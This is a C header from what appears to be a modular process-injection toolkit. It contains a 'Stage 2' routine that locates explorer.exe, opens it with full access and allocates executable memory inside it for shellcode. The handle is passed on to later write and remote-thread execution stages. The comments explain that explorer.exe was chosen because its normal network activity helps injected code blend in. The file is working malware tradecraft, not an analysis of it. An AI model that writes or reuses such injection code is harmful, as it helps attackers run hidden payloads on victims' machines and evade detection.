#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

// T2.3 — Remote allocation into existing explorer.exe
//
// Finds the running explorer.exe process (always present on a logged-in
// Windows session, owned by the same user as the payload), opens a
// handle to it, and allocates memory inside its address space for the
// shellcode. Stores the target_process handle in the context for L4
// (write_remote) and L5 (exec_remote_thread) to consume.
//
// Pairing: T2.3 + T4.3 + T5.4 (the remote chain shares target_process).
//
// Choice of explorer.exe over a freshly-spawned process is deliberate:
// explorer is always present on an interactive session, communicates
// over the network in normal operation (OneDrive, search, Store, etc.),
// and matches the target most commonly observed in real-world injection.
inline BOOL Stage2_Alloc_Remote(TechniqueContext* ctx)
{
    if (!ctx) return FALSE;

    DWORD pid = GetProcessIdByName(L"explorer.exe");
    if (pid == 0) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 2", "explorer.exe not running; cannot inject");
#endif
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 2", "OpenProcess(explorer pid=%lu) failed: %lu",
                  pid, GetLastError());
#endif
        return FALSE;
    }

    ctx->target_process = hProcess;
    ctx->target_thread  = NULL;  // find-and-inject has no suspended thread

    ctx->allocated_mem = (unsigned char*)MyVirtualAllocEx(
                            hProcess,
                            NULL,
                            ctx->length,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE
                        );

#ifdef DEBUG_MODE
    if (ctx->allocated_mem) {
        DEBUG_MSG("Stage 2", "Remote alloc %llu bytes at %p in explorer pid %lu",
                  ctx->length, ctx->allocated_mem, pid);
    } else {
        DEBUG_MSG("Stage 2", "Remote alloc failed in explorer pid %lu", pid);
    }
#endif

    return ctx->allocated_mem != NULL;
}
